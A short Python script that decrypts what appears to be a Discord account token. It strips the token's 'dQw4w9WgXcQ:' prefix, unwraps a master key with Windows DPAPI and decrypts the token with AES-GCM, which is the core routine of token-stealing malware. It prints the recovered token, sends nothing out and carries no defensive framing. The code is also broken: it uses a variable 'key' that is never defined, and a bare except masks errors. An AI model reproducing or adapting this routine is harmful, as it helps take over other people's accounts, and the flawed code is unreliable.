from base64 import b64decode
import os

from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData


def decrypt(buff, master_key):
    try:
        return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(
            buff[15:])[:-16].decode()
    except:
        return "Error"


def main():
    enc_token = os.getenv('ENC_TOKEN')
    tok = decrypt(b64decode(enc_token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])
    print(tok)


if __name__ == '__main__':
    main()
